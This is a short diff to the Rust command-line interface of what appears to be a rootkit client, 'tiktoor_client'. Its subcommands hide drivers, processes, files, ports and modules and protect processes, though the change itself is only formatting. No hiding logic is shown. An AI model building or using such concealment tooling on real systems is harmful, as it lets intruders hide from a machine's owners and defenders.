@@ -4,7 +4,7 @@ use structopt::StructOpt;
 #[derive(StructOpt)]
 enum Cli {
     /// Hide driver
-    DriverHiding{
+    DriverHiding {
         /// driver name
         #[structopt(short, long)]
         rank: u32,
@@ -20,7 +20,7 @@ enum Cli {
         pid: u32,
     },
     /// Protect process
-    ProcessProtection{
+    ProcessProtection {
         /// Process pid
         #[structopt(short, long)]
         pid: u32,
@@ -39,7 +39,7 @@ fn main() {
         Cli::FileHiding => {}
         Cli::PortHiding => {}
         Cli::ProcessHiding { pid } => tiktoor_client::hide_process(pid),
-        Cli::ProcessProtection { pid } => {tiktoor_client::protect_process(pid)},
+        Cli::ProcessProtection { pid } => tiktoor_client::protect_process(pid),
         Cli::ModuleHiding => tiktoor_client::hide_module(),
         Cli::ModuleUnhiding => tiktoor_client::unhide_module(),
     }
